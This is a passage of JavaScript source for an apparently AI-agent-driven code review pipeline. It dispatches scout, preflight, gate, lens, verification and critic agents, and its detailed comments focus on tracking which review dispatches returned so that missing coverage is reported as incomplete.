  if (!plan.lenses.length) plan.lenses = blanketLenses(profile)
  addRequiredLenses(profile, scout, plan)
  addRigorFloors(profile, plan)
  const surfaceDropped = applySurfaceGate(scout, plan)
  return { plan, surfaceDropped }
}

// realm @nick/craft, node #295: the light pass keeps the diff-scoped lenses for one round; the
// whole-diff lenses it drops are named on every report (lightSection); those the diff calls for, on
// controller code or a contract path, it keeps (realm @nick/craft, node #299).
/** @param {Profile} profile @param {ScoutAnswer | null} scout @param {Plan} plan */
function applyLightProfile(profile, scout, plan) {
  if (!lightPass) return
  const forced = [...lightForcedLenses(changedFiles, profile.diffGlobs, profile.lenses), ...lightCalledForLenses(changedFiles, scoutChoseReconciler(scout), profile.lenses)]
  const { kept, skipped } = lightLenses(plan.lenses, WHOLE_DIFF_LENSES, blanketLenses(profile), forced)
  plan.lenses = kept
  plan.maxRounds = 1
  for (const l of skipped) lightSkippedLenses.add(l)
  for (const l of kept) if (WHOLE_DIFF_LENSES.includes(l)) lightKeptLenses.add(l)
  log(`[${profile.id}] light pass: ${kept.join(', ')}, one round${skipped.length ? `; whole-diff lenses skipped: ${skipped.join(', ')}` : ''}`)
}

/** @param {Profile} profile @param {ScoutAnswer | null} scout @param {Plan} plan */
function logScoutPlan(profile, scout, plan) {
  log(`[${profile.id}] ${!scout ? '⚠️ scout did not return — conservative fallback plan' : (scout.notes || 'scout: classified')} · ${plan.sizeBucket}${plan.securitySensitive ? ' · SECURITY floor (all lenses, 3-vote)' : ''}${plan.lenses.includes('negative-space') ? ' · +negative-space' : ''}`)
}

// ================= Per-profile pipeline: scout → gate → lenses → verify → critic =================
/** The single dispatch point's record of what ran, for the optional and surface-gate tallies. @param {string} lens */
function noteLensDispatched(lens) {
  // The single dispatch point for every lens on every path. Recording here — not at plan time — is
  // what makes the report and the run record physically unable to disagree with what happened.
  if (OPTIONAL_LENSES.includes(lens)) optionalDispatched.add(lens)
  // realm @nick/craft #102: mirrors the line above — a surface-gated lens that actually ran in ANY
  // profile is subtracted from the reported/recorded "dropped" set by surfaceGateTally().
  if (SURFACE_GATED_LENSES[lens]) surfaceGateDispatched.add(lens)
}

/** The preflight pass and its declared-probe audit, both logged. @param {Profile} profile */
async function runPreflight(profile) {
// Cheap and first: resolve the runner, the compile blockers and what CI already covers, so the gate
// spends its time on signals rather than on discovering its own environment. Best-effort by design —
// a preflight that dies just leaves the gate to work it out the old way.
const preflight = await ragent(preflightPrompt(profile, { baseRef }),
  // 5min, not the phase default. Three numbers set it, and the deadline must clear ALL of them:
  //  · the prompt declares a 3min ceiling, and a deadline at twice that makes the budget advisory —
  //    nothing then stops a pass that ignores the ceiling. 5min stays under 2x and keeps it real.
  //  · the measured cost of an earlier version of this pass was 207s, ALREADY past three minutes.
  //  · the clock starts at DISPATCH, not at execution, so it covers queue wait PLUS the run.
  // A deadline between those last two (210000 did exactly this) times out work that would have
  // landed. Losing preflight is survivable — the gate re-establishes everything itself, the slow
  // way — so the bound is set above the measured cost rather than tight against it.
  // THE COST ARGUMENT THAT USED TO STAND HERE IS NO LONGER TRUE, and the constant survives it.
  // It read: a miss costs TWO dispatches, because `ragent` abandoned the wait and re-dispatched
  // with a fresh deadline, so a hung pass burned up to 10min. The deadline is now ONE budget
  // shared by the attempts, and a deadline fire spends it by definition — so a miss costs one
  // dispatch and at most these 5 minutes, and the second attempt exists only for the fast death
  // that leaves budget behind. 300000 is therefore now a straightforwardly bounded 5min ceiling,
  // not a 10min one accepted as a trade.
  { label: `preflight:${profile.id}`, schema: PREFLIGHT_SCHEMA, phase: 'Gate', model: 'haiku', effort: 'low', deadlineMs: 300000 })
// The declared-probe audit. Named in the log and carried into the record so a breach of the
// "ask each source once" rule is a fact of the run rather than a matter of the prompt's manners.
const probeViolations = auditPreflightProbes(preflight)
if (probeViolations.length) {
  log(`⚠️ [${profile.id}] PREFLIGHT PROBE BUDGET BREACHED (${probeViolations.length}): ${probeViolations.join(' · ')}`)
}
if (preflight) {
  log(preflightLine(profile, preflight))
} else {
  // Never silent: no preflight line at all would read as "this run had no preflight step".
  log(`⚠️ [${profile.id}] Preflight unavailable (failed or passed its deadline) — the gate establishes the environment itself, and its provenance says so.`)
  // DELIBERATELY NOT `notRun`, unlike a dead scout. `notRun` drives the INCOMPLETE verdict and
  // means "a review step did not happen; re-run it". A dead scout satisfies that: the plan
  // degrades to the conservative fallback and the scouted intent is genuinely lost. A dead
  // preflight loses no coverage — every fact it resolves is re-established by the gate, and
  // preflightBrief() tells the gate to do exactly that. It costs time, not signal. Marking such a
  // run INCOMPLETE would flag a pure performance fallback as an unfinished review and dilute the
  // marker for the cases that mean it. The loss stays visible where it belongs: this log line and
  // `preflight.status: 'unavailable'` in the run record.
}
return { preflight, probeViolations }
}

/** @param {Profile} profile @param {Preflight} preflight */
function preflightLine(profile, preflight) {
  return `[${profile.id}] Preflight: runner ${preflight.runner ? `\`${preflight.runner.trim()}\`` : '(none)'}`
    + ` · ${preflight.blockers?.length ? `${preflight.blockers.length} compile blocker(s)` : 'no compile blockers'}`
    + ` · CI covers ${preflight.ciCovers?.length ? preflight.ciCovers.join(', ') : 'nothing'}`
    + `${preflight.missingTools?.length ? ` · missing: ${preflight.missingTools.join(', ')}` : ''}`
    + `${preflightIsPartial(preflight) ? ' · ⚠️ PARTIAL — see notes' : ''}`
}

/** @param {GateAnswer | null} gate */
function gateFields(gate) {
  return {
    gateStatus: gate?.status ?? 'unknown',
    gateProvenance: gate?.provenance ?? 'gate not established',
    failedChecks: gate?.failedChecks ?? [],
    // Red, real, and NOT this diff's doing. Kept out of failedChecks so it cannot stop the review, and
    // out of notes so it cannot be quietly lost: it prints on every verdict, including a green one.
    carriedChecks: gate?.carriedChecks ?? [],
  }
}

/** @param {GateAnswer | null} gate */
function gateSeedFindings(gate) {
  return (gate?.seedFindings ?? []).map((/** @type {Finding} */ f) => ({ ...f, source: f['source'] || 'tool' }))
}

/** @param {Profile} profile @param {string} gateStatus @param {string} gateProvenance @param {string[]} failedChecks @param {string[]} carriedChecks */
function logGate(profile, gateStatus, gateProvenance, failedChecks, carriedChecks) {
  log(`[${profile.id}] Gate: ${gateStatus} — ${gateProvenance}${failedChecks.length ? ` · failed: ${failedChecks.join(', ')}` : ''}${carriedChecks.length ? ` · ${carriedChecks.length} pre-existing (carried, not blocking)` : ''}`)
}

/** @param {string} gateProvenance @param {Preflight | null} preflight */
function toolProvenanceFor(gateProvenance, preflight) {
  // What a VERIFIER needs to run a tool, as opposed to what the RECORD needs to explain the gate.
  // Kept separate so the preflight's runner prefix never leaks into the persisted provenance string.
  return [
    gateProvenance,
    preflight?.runner ? `run every tool as \`${flattenField(preflight.runner).trim()} <cmd>\` — bare invocations die in missing system libraries` : '',
    preflight?.blockers?.length ? `CANNOT compile here: ${preflight.blockers.map(flattenField).join('; ')} — a tool needing a build is unrunnable, say so rather than reporting its error as evidence` : '',
  ].filter(Boolean).join(' · ')
}

/** The preflight as the plan checkpoint records it. @param {Preflight | null} preflight @param {string[]} probeViolations */
function preflightCheckpoint(preflight, probeViolations) {
  return preflight
    ? { status: preflightIsPartial(preflight) ? 'partial' : 'ok', runner: preflight.runner, blockers: preflight.blockers, missingTools: preflight.missingTools, ciCovers: preflight.ciCovers, notes: preflight.notes, probeViolations }
    : { status: 'unavailable' }
}

/** @param {Profile} profile */
async function reviewProfile(profile) {
  // ---- Scout ----
  const scout = await ragent(scoutPrompt(profile), { label: `scout:${profile.id}`, schema: SCOUT_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' })
  // A dead/timed-out scout falls back to the CONSERVATIVE plan (all lenses, security floor → 3-vote),
  // never a permissive one — but it must not read as a successful classification either: the fallback
  // loses the scouted intent, churn and size, so it is logged loudly and carried into `notRun` so the
  // verdict says INCOMPLETE rather than a clean Approve.
  const scoutFailed = !scout
  const scoutNotRun = scoutFailed
    ? [`${profile.id} scout classification — the plan is the conservative fallback (all lenses, 3-vote, 2 rounds), not a scouted one`]
    : []
  const { plan, surfaceDropped } = planFromScout(profile, scout)
  applyLightProfile(profile, scout, plan)
  // Only the UNIVERSE is recorded here: which optional lenses this profile could have bought. It rides
  // back on the profile's result; what ran is recorded at dispatch (`runLens`) and subtracted by
  // `optionalTally()`, because the plan is not final at this point — see the tally's definition.
  const optionalScope = profile.lenses.filter((/** @type {string} */ l) => OPTIONAL_LENSES.includes(l))
  logScoutPlan(profile, scout, plan)

  // Lens runner: prefer the profile's dedicated reviewer agent; if that agent type is not
  // registered in this session (stale plugin registry), fall back to the generic workflow
  // subagent — lens prompts are self-contained. The miss is LEARNED once (reviewerAgentMissing):
  // without it the absent agent type is re-attempted on every lens × round, which floods the run
  // with "agent type '<x>' not found". Both failure shapes are handled — a thrown /not found/ and
  // a null return (some runtimes signal an unknown agent type that way). Record the real failure
  // reason so INCOMPLETE reporting doesn't have to guess (budget vs registry vs death).
  /** @type {Map<string, string>} */
  const lensFailures = new Map()
  let reviewerAgentMissing = false
  // Keyed by DISPATCH, not by lens name. Once a lens fans out over slices there are several live
  // dispatches under one name, and a name-keyed map keeps only the last failure — so the reported
  // reason would name one slice's error as if it were the lens's.
  const dispatchKey = (/** @type {string} */ lens, /** @type {Slice | null} */ slice) => (slice ? `${lens} :: ${slice.key}` : lens)
  // An answer is model output: the schema shapes it, but an off-schema answer still arrives. One
  // without a findings array did not review — counting it as returned would read `{}` as a clean lens
  // and iterate a string or a number as findings. It is a lens failure with its own reason, so every
  // caller (the round, the resurrection sweep, the critic follow-ups) sees exactly what a dead lens is.
  /** @param {string} lens @param {string} prompt @param {string} phaseName @param {string} labelSuffix @param {Slice | null} [slice] @returns {Promise<FindingsAnswer | null>} */
  async function runLens(lens, prompt, phaseName, labelSuffix, slice = null) {
    const res = await dispatchLens(lens, prompt, phaseName, labelSuffix, slice)
    if (res != null && !Array.isArray(/** @type {{ findings?: unknown }} */ (res).findings)) {
      lensFailures.set(dispatchKey(lens, slice), 'answered off-schema (no findings array)')
      log(`⚠️ [${profile.id}] lens ${dispatchKey(lens, slice)} answered off-schema (no findings array) — counted as not returned`)
      return null
    }
    return res
  }
  // A fallback counts as answered only when runLens would accept it: an off-schema answer is a dead lens.
  const answeredFindings = (/** @type {unknown} */ r) => r != null && Array.isArray(/** @type {{ findings?: unknown }} */ (r).findings)
  /** @param {string} lens @param {string} prompt @param {string} phaseName @param {string} labelSuffix @param {Slice | null} [slice] */
  async function dispatchLens(lens, prompt, phaseName, labelSuffix, slice = null) {
    noteLensDispatched(lens)
    const opts = { label: `lens:${profile.id}:${lens}${labelSuffix}`, phase: phaseName, schema: FINDINGS_SCHEMA, model: plan.lensModel }
    const runGeneric = async () => {
      try {
        return await ragent(prompt, opts)
      } catch (e) {
        lensFailures.set(dispatchKey(lens, slice), String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 160))
        return null
      }
    }
    if (reviewerAgentMissing) return runGeneric()
    try {
      const res = await ragent(prompt, { ...opts, agentType: profile.reviewerAgent })
      if (res != null) return res
      // Null (not a throw) from the reviewer path: on some runtimes an unknown agent type returns
      // null rather than throwing. ragent already retried; try the generic subagent once. Do NOT
      // set reviewerAgentMissing — a null can be a transient API death, so later lenses still get
      // a shot at the real reviewer agent. Counted, so the report can say it happened — only when the
      // generic subagent answered: dead on both paths is a dead lens, as rust-audit counts it (#116).
      const fallback = await runGeneric()
      if (answeredFindings(fallback)) noteReviewerAgentFallback(profile)
      return fallback
    } catch (e) {
      return reviewerAgentThrew(e, lens, slice, runGeneric)
    }
  }

  // The reviewer-agent dispatch threw: an unregistered agent type routes this and every later lens to
  // the generic subagent; any other error is this dispatch's failure, retried generically only when it reads /not found/.
  /** @param {unknown} e @param {string} lens @param {Slice | null} slice @param {() => Promise<FindingsAnswer | null>} runGeneric */
  async function reviewerAgentThrew(e, lens, slice, runGeneric) {
    const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
    // dispatchKey, like the other write to this map. Keyed by bare name the real error message was
    // looked up under a key nobody uses, so a sliced dispatch that died WITH a reason was reported
    // as "died without an error" — and any sibling slice could overwrite it.
    if (!isAgentTypeMissing(msg, profile.reviewerAgent)) {
      // Recorded first, so a generic run that also returns nothing still reports this error (a generic
      // throw overwrites it with its own). Not memoized: a real unregistered type in unknown wording
      // costs one failed agent dispatch per lens — the price of not guessing at the text (#116).
      lensFailures.set(dispatchKey(lens, slice), msg.slice(0, 160))
      if (!/not found/i.test(msg)) return null
      const fallback = await runGeneric()
      if (answeredFindings(fallback)) { lensFailures.delete(dispatchKey(lens, slice)); noteReviewerAgentNotFound(profile, msg.slice(0, 160)) }
      return fallback
    }
    reviewerAgentMissing = true; noteReviewerAgentMissing(profile, msg)
    log(`⚠️ [${profile.id}] agent type '${profile.reviewerAgent}' not registered here — routing remaining lenses to the generic subagent`)
    return await runGeneric()
  }

  // ---- Preflight ----
  const { preflight, probeViolations } = await runPreflight(profile)

  // ---- Gate ----
  const gate = await ragent(profile.gate({ baseRef, isLibrary: plan.isLibrary, securitySensitive: plan.securitySensitive, preflight }),
    { label: `gate:${profile.id}`, schema: GATE_SCHEMA, phase: 'Gate', effort: 'medium' })
  const { gateStatus, gateProvenance, failedChecks, carriedChecks } = gateFields(gate)
  const seedFindings = gateSeedFindings(gate)
  logGate(profile, gateStatus, gateProvenance, failedChecks, carriedChecks)
  const toolProvenance = toolProvenanceFor(gateProvenance, preflight)
  // First checkpoint: from here on, a run that dies still says what was planned and whether the tree
  // was green. Everything before this point is cheap to redo; everything after it is not.
  // `head` is the RUN'S HEAD, the same value the final record carries, and the diff base rides under
  // its own `baseRef` key. Both once shared the `head` key — the checkpoints got the base (a ref NAME
  // like `origin/main`) while the final record got the sha — so the two sides of every
  // checkpoint↔record comparison spelled the field differently: `finalizeRun` folded 0 phases and
  // left the `.partial` directory behind, and `recover` then read a ref name as a commit and promoted
  // the leftover as a separate partial run. Two keys, each meaning one thing.
  //
  // `round` rides on every checkpoint for one reason: `recover` promotes an unfinalized directory
  // into a real record and DELETES the directory, and a record with no round is indexed as round 0 —
  // so one repair permanently reset the chain to a first review. The round number is knowable only
  // here, by the run itself; nothing downstream can reconstruct it.
  await checkpoint(`${profile.id}-plan`, {
    language: profile.id, branch, head, baseRef, round: thisRound,
    scout: { size: plan.sizeBucket, lenses: plan.lenses, maxRounds: plan.maxRounds, verifyVotes: plan.verifyVotes, securitySensitive: plan.securitySensitive },
    gate: { status: gateStatus, provenance: gateProvenance, failedChecks, carriedChecks, seeds: seedFindings.length },
    // `status` so a reader of the record can tell a preflight that ran and found nothing from one
    // that never answered — a bare `null` collapsed both into the same, more permissive, reading.
    preflight: preflightCheckpoint(preflight, probeViolations),
  }, 'Gate')
  if (gateStatus === 'fail') {
    return { profile, plan, surfaceDropped, optionalScope, ranLenses: /** @type {string[]} */ ([]), lensRounds: [], gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], unverified: [], dropped: 0, notRun: [...scoutNotRun], criticNotes: '', probeViolations }
  }

  // ---- Probe reviewer-agent availability ONCE up front ----
  // The per-lens fallback (runLens) already recovers, but it learns the miss only after the FIRST
  // attempt — and the round-1 lenses fan out in parallel, so without this every lens in round 1
  // would fail with "agent type '<x>' not found" before the memo is set. One cheap probe collapses
  // that opening wave to a single attempt. Best-effort: only a thrown /not found/ marks it missing;
  // a result, a null, or an unrelated error leaves the per-lens fallback to decide.
  await probeReviewerAgent()

  // The probe: only a thrown /not found/ marks the reviewer agent missing.
  async function probeReviewerAgent() {
    if (profile.reviewerAgent && !reviewerAgentMissing) {
      try {
        await agent('Reply with the single word: OK.', { label: `probe:${profile.id}`, phase: 'Gate', model: 'haiku', effort: 'low', agentType: profile.reviewerAgent })
      } catch (e) {
        const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
        if (isAgentTypeMissing(msg, profile.reviewerAgent)) {
          reviewerAgentMissing = true; noteReviewerAgentMissing(profile, msg)
          log(`[${profile.id}] reviewer agent '${profile.reviewerAgent}' not registered — all lenses will use the generic subagent`)
        }
      }
    }
  }

  // ---- Lenses (loop-until-dry) ----
  phase('Lenses')
  /** @type {Set<string>} */
  const seen = new Set()
  /** @type {Finding[]} */
  const pool = []
  // A gate seed is round 0 of the lens-round yield (lib/lens-round-yield.mjs).
  for (const f of seedFindings) { const k = key(f); if (!seen.has(k)) { seen.add(k); pool.push({ ...f, foundInRound: 0 }) } }
  const profileNotRun = [...scoutNotRun]
  // ONE coverage ledger, counted over DISPATCHES. There used to be a second, `ranAtLeastOnce`, and
  // after the dispatch accounting landed it was written twice and read nowhere — dead state whose
  // comment still claimed a role, which is how a reader comes to believe there are two ledgers that
  // might disagree. A dispatch that was expected and never came back is a hole whatever its
  // siblings did, and that is the whole of it.
  /** @type {Set<string>} */
  const expectedDispatches = new Set()
  /** @type {Set<string>} */
  const returnedDispatches = new Set()
  /** @type {Array<{ round: number, agents: number, returned: number, newFindings: number }>} */
  const lensRounds = []
  // Lenses the completeness critic added and that were dispatched — on the record, because they change
  // what a round cost without changing its plan (lib/round-pairs.mjs compares them, realm #97).
  /** @type {string[]} */
  let criticFollowupLenses = []
  // Computed ONCE for the whole profile, not per round: the changed-file set does not move between
  // rounds, and re-slicing per round would let a lens's slice key drift between round 1 and round 2
  // for no reason a reader could follow in the transcript.
  // ALL changed files go in, with the profile asked INSIDE. Filtering to the profile first would
  // drop the manifest and the lockfile before slicing, and a slice that cannot see the manifest
  // cannot tell that a shipped CRD lacks the field the code writes.
  const diffSlices = sliceDiff(changedFiles, { owns: f => profile.detect([f]) })
  if (diffSlices.length) log(`[${profile.id}] diff sliced into ${diffSlices.length} scope(s) for the code-intrinsic lenses: ${diffSlices.map(g => `${g.key} (${g.files.length})`).join(' · ')}. Whole-diff lenses (${WHOLE_DIFF_LENSES.join(', ')}) still see everything.`)
  // `[null]` means "one dispatch, unsliced" — the shape the caller had before slicing existed, so
  // the unsliced path stays the same code rather than a branch that can drift from it.
  const lensSlicesFor = (/** @type {string} */ lens) => (diffSlices.length && sliceableLens(lens) ? diffSlices : [null])
  // One round of the lens loop; true when it surfaced nothing new (the loop is dry).
  /** @param {number} round */
  async function lensRound(round) {
    const priorSummary = priorFoundSummary(pool)
    // EXPECTED is built from the same expression that dispatches, so the two cannot drift. What a
    // lens fanned out into is now the unit of coverage: before slicing, a lens either ran or did
    // not, and a death forced INCOMPLETE. With six slices per lens, five could die while one
    // returned — and a name-keyed "did this lens run" answers yes, `droppedLenses` comes back
    // empty, and the run reports an ordinary verdict over five sixths of a diff that no lens of
    // that kind ever read. Slicing multiplies the chances of losing coverage by the slice count, so
    // the accounting has to be per slice or the whole partition is a way of hiding holes.
    const dispatches = plan.lenses.flatMap(lens => lensSlicesFor(lens).map(slice => ({ lens, slice })))
    for (const d of dispatches) expectedDispatches.add(dispatchKey(d.lens, d.slice))
    // WINDOWED, for the same measured reason verification is. Slicing turns a wave of a dozen lenses
    // into one of ~70, and an unwindowed wave that size makes agents queue — while the Lenses
    // deadline clocks from DISPATCH, so the wait is inside it and it fires on healthy agents that
    // did nothing but stand in line. Applying the mitigation this file already documents for this
    // exact shape, rather than discovering it again.
    const settled = await weightedWindow(
      dispatches.map(d => ({ weight: 1, run: () => runLens(d.lens, lensPrompt(d.lens, priorSummary, profile, plan, d.slice), 'Lenses', ` r${round}${d.slice ? ` ${d.slice.key}` : ''}`, d.slice) })),
      LENS_WINDOW_AGENTS,
      (run, i) => run().then(r => (r ? { ...r, __key: dispatchKey(/** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens, /** @type {(typeof dispatches)[number]} */ (dispatches[i]).slice), __lens: /** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens } : null)),
    )
    const landedResults = settled.filter(r => r != null)
    // `__lens`, not the model's `lens` field. Coverage already avoided trusting it; the finding's
    // `source` and the ran-set did not, and a dispatch answering with a mangled name sent its
    // findings to `source: 'unknown'` while its dimension row read `ran: true` with zero findings —
    // the yield inversion `ranLenses` exists to prevent, arriving one field over.
    for (const r of landedResults) returnedDispatches.add(r.__key)
    const fresh = []
    for (const r of landedResults) {
      for (const f0 of (r.findings || [])) {
        const f = { ...f0, source: r.__lens, foundInRound: round }
        const k = key(f)
        if (!seen.has(k)) { seen.add(k); fresh.push(f) }
      }
    }
    pool.push(...fresh)
    // Per-round yield, persisted to the run record. Lenses are the other half of a review's cost
    // (182 min / 31 agents on a measured run) and every round re-runs EVERY lens over the whole
    // diff, but whether round 2 earns that is unknowable after the fact: the gate's seed findings
    // make the pool non-empty from round 1, so a transcript cannot be split by round. Record it
    // rather than guess — a later `maxRounds` cut should be argued from these numbers.
    // ONE LINK THE "a finding cannot be lost" CHAIN DID NOT HAVE, recorded here because this is where
    // a reader looks for it. `if (!fresh.length) dry = true` below ends the search, and the
    // ALREADY-FOUND cap (priorFoundSummary) makes a withheld entry MORE likely to be re-surfaced:
    // `seen` drops it as a duplicate, `fresh` comes back empty, the round reads as dry and the loop
    // stops. No finding is lost — the pool keeps every entry and priors are adjudicated on their own
    // track — but the SEARCH can end a round early, and `newFindings` here (the very number a later
    // `maxRounds` cut would be argued from) is biased downward by the same mechanism.
    // Deliberately NOT fixed: a re-surfaced duplicate is indistinguishable from a genuinely dry round
    // at this point, so "dry unless something new that is not a known duplicate" would mean splitting
    // the `seen` key set by provenance and paying an extra full round of lens cost — against a prompt
    // saving that is about 1.8% of what the lens agents read. So do not read a dry round as proof the
    // diff is exhausted, and do not argue a round cut from `newFindings` alone.
    // `agents` is what was DISPATCHED this round, which with slicing is lenses × slices and no
    // longer the lens count. Left as `plan.lenses.length` it undercounted, so `returned` could
    // exceed it and any death accounting downstream read inverted — and this is the field that
    // makes a lost slice visible in the record at all.
    lensRounds.push({ round, agents: dispatches.length, returned: landedResults.length, newFindings: fresh.length })
    log(`[${profile.id}] Lenses round ${round}: +${fresh.length} new (pool ${pool.length})`)
    return !fresh.length
  }
  // The consumer's own agents (realm @nick/craft, node #295) run once, beside round 1, in the first
  // profile only: they review the whole change, so a second profile would buy them twice.
  const extraFindings = extraLensesFor(profile, pool)
  let dry = false
  for (let round = 1; round <= plan.maxRounds && !dry; round++) dry = await lensRound(round)
  pushUnseen(await extraFindings, seen, pool)
  profileNotRun.push(...extraLensGaps(profile))

  // ---- Resurrection sweep ----
  // A lens agent occasionally returns null on a transient API death / connection drop. That
  // dispatch is then counted as a hole in the ledger, and a hole alone marks the whole review
  // INCOMPLETE — even when the surviving
  // lenses found plenty. Since the failure is transient, a targeted retry of ONLY the missing lenses
  // recovers most of them. Bounded to 2 extra attempts; re-uses the same runLens/lensPrompt path.
  // MISSING IS NOW A DISPATCH QUESTION. A lens that lost one slice of six is not recovered by the
  // fact that its other five returned, so the sweep must see it — and the retry it sends is
  // deliberately UNSLICED, which is why recovering it restores the lens's whole coverage below.
  const lensesWithHoles = () => plan.lenses.filter(l => [...expectedDispatches].some(k => (k === l || k.startsWith(`${l} :: `)) && !returnedDispatches.has(k)))
  // A resurrected lens's answer: its holes closed, its new findings pooled.
  /** @param {FindingsAnswer & { __lens: string }} r */
  function absorbResurrected(r) {
    const lens = r.__lens
    // A resurrection dispatch carries NO slice, so it reviewed the whole diff — which is exactly
    // what closes every hole this lens had. Marking only the lens name would leave the per-slice
    // ledger still reporting holes that were just filled, and the run would claim INCOMPLETE over
    // coverage it actually has.
    for (const k of expectedDispatches) if (k === lens || k.startsWith(`${lens} :: `)) returnedDispatches.add(k)
    for (const f0 of (r.findings || [])) {
      const f = { ...f0, source: lens }
      const k = key(f)
      if (!seen.has(k)) { seen.add(k); pool.push(f) }
    }
  }
  async function resurrectionSweep() {
    let missing = lensesWithHoles()
    for (let sweep = 1; sweep <= 2 && missing.length; sweep++) {
      log(`[${profile.id}] Resurrection sweep ${sweep}: retrying ${missing.length} lens(es) that never returned (${missing.join(', ')})`)
      const priorSummary = priorFoundSummary(pool)
      // Carries the lens it DISPATCHED alongside the answer. Everywhere else this accounting refuses
      // to trust the model-returned `lens` field, and here it was still being trusted: a resurrection
      // that succeeded but answered with a missing or mangled `lens` closed no holes, so the sweep
      // kept seeing them, both attempts were spent, and the run reported INCOMPLETE over coverage it
      // actually had. A false hole that cannot be cleared is as much a lie as a hidden one.
      const attempts = missing.map(lens => ({ lens }))
      const settled = await parallel(attempts.map(a => () =>
        runLens(a.lens, lensPrompt(a.lens, priorSummary, profile, plan), 'Lenses', ` resurrect${sweep}`)
          .then(r => (r ? { ...r, __lens: a.lens } : null)),
      ))
      const resurrected = settled.filter(r => r != null)
      for (const r of resurrected) absorbResurrected(r)
      missing = lensesWithHoles()
    }
  }
  await resurrectionSweep()

  // DERIVED by subtraction from what was dispatched, never from a list built beside it. A lens whose
  // every slice returned contributes nothing here; a lens that lost one slice of six is reported as
  // losing that slice, by name, because "safety ran" is true and useless when five sixths of the
  // diff got no safety review.
  // The dispatches that never returned, each with its reason, carried into notRun and the log.
  function reportDroppedLenses() {
    const neverReturned = [...expectedDispatches].filter(k => !returnedDispatches.has(k))
    if (neverReturned.length) {
      // Falls back to the BARE lens name, because the resurrection sweep dispatches unsliced and can
      // only key its failure that way. Without the fallback every sliced hole read "died without an
      // error" even when the retry died with a captured message — losing the diagnosis for exactly
      // the sliced case, which is what keying by dispatch was introduced to fix.
      const reasonFor = (/** @type {string} */ k) => lensFailures.get(k) || lensFailures.get(k.split(' :: ')[0] ?? k) || 'returned no result (skipped or died without an error)'
      const reasons = neverReturned.map(k => `${k}: ${reasonFor(k)}`).join(' · ')
      profileNotRun.push(`${profile.id} lenses that never returned — ${reasons}`)
      log(`⚠️ [${profile.id}] ${neverReturned.length} lens dispatch(es) never returned (${reasons}). Review marked INCOMPLETE.`)
    }
    return neverReturned
  }
  const droppedLenses = reportDroppedLenses()
  // `ranLenses` rides along to the record: the dimension rows are built from plan.lenses, so a lens
  // that never returned still gets a row reading 0 findings — indistinguishable from a lens that ran
  // and found nothing. That is the difference between "redundant, consider dropping it" and "broken,
  // fix it", and the yield analysis inverts on it.
  // FULLY ran, not "ran at all". A lens that returned one slice of six covered a sixth of the diff,
  // and a dimension row built from the looser test presents its partial findings as whole-diff
  // coverage — "safety ran" is true and useless, which is exactly the phrasing the accounting above
  // rejects. The verdict is already saved by `droppedLenses`; this is the reader's fidelity.
  const ranLenses = plan.lenses.filter(l => [...expectedDispatches].every(k => (k !== l && !k.startsWith(`${l} :: `)) || returnedDispatches.has(k)))
  // The lens phase is the expensive half of a review and the half most often lost: on the run that
  // prompted this, verification died to a usage limit and took every lens's yield with it.
  // `branch`/`head` on every checkpoint, not only the first. `--rejoin` can be armed ONLY after a
  // checkpoint failed, so it is never armed on the `-plan` payload — and `-plan` was the only one
  // carrying identity. The rejoin search therefore saw `{project, '', ''}` on exactly the paths where
  // it fires, and matched on the repository alone: any concurrent review of the same repo qualified.
  await checkpoint(`${profile.id}-lenses`, {
    language: profile.id, branch, head, baseRef, round: thisRound, ranLenses, droppedLenses, lensRounds,
    candidates: summarizeFindings(pool),
    candidatesBySource: pool.reduce((m, f) => ({ ...m, [f.source || 'unknown']: (m[f.source || 'unknown'] || 0) + 1 }), /** @type {Record<string, number>} */ ({})),
    notRun: profileNotRun,
  }, 'Lenses')
  if (!pool.length) {
    return { profile, plan, surfaceDropped, optionalScope, ranLenses, lensRounds, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], unverified: [], dropped: 0, notRun: profileNotRun, criticNotes: '', probeViolations }
  }

  // ---- Verify ----
  phase('Verify')
  const deduped = await dedupPool(rollupPool(applyPathFloor(pool), profile), profile)
  let { confirmed: profileConfirmed, suspected: profileSuspected, unverified: profileUnverified, dropped: profileDropped, refuted, notRun: verifyNotRun, savedByFloor: profileSavedByFloor } = await verifyPool(deduped, plan, profile, toolProvenance)
  // Verification that never ran joins the lens-level list: a dead batch verifier is a hole in
  // coverage exactly like a lens that never returned, and both must reach the verdict as INCOMPLETE.
  profileNotRun.push(...verifyNotRun)
  log(`[${profile.id}] Verify: ${profileConfirmed.length} confirmed · ${profileSuspected.length} suspected · ${profileDropped} refuted · ${profileUnverified.length} not verified`)
  await checkpoint(`${profile.id}-verify`, {
    language: profile.id, branch, head, baseRef, round: thisRound,
    verdict: honestVerdict(finalVerdict(profileConfirmed), profileNotRun),
    findings: summarizeFindings(profileConfirmed),
    // `candidates` counts what verification EXAMINED, so the unverified tier is reported beside it
    // rather than inside it.
    verification: { candidates: deduped.length - profileUnverified.length, confirmed: profileConfirmed.length, suspected: profileSuspected.length, refuted: profileDropped, unverified: profileUnverified.length },
  }, 'Verify')

  // ---- Completeness critic (large or security-sensitive; budget-gated) ----
  phase('Synthesize')
  // The completeness critic, when the plan is large or security-sensitive and the budget allows it.
  async function completenessCritic() {
    // A light pass runs no critic: its follow-up lenses are the extra round the light pass forgoes (#295).
    if (lightPass) return
    const criticInScope = plan.sizeBucket === 'large' || plan.securitySensitive
    if (criticInScope && (!budget.total || budget.remaining() > 90000)) {
      await runCritic()
    } else if (criticInScope) {
      profileNotRun.push(`${profile.id} completeness-critic`)
      log(`Budget low (~${Math.round(budget.remaining() / 1000)}k left) — SKIPPED [${profile.id}] completeness critic. Review marked INCOMPLETE.`)
    }
  }
  async function runCritic() {
    const candidates = profile.lenses.filter((/** @type {string} */ l) => !plan.lenses.includes(l))
    const critic = await ragent(
      `You are a completeness critic for a ${profile.lang} review of the diff (base ${flattenField(baseRef) || 'HEAD'}).
Lenses already run: ${plan.lenses.join(', ')}. Confirmed: ${profileConfirmed.length}, Suspected: ${profileSuspected.length}.
Name any review lens that was NOT run but SHOULD be, given what the diff touches — choose ONLY from: ${JSON.stringify(candidates)}.
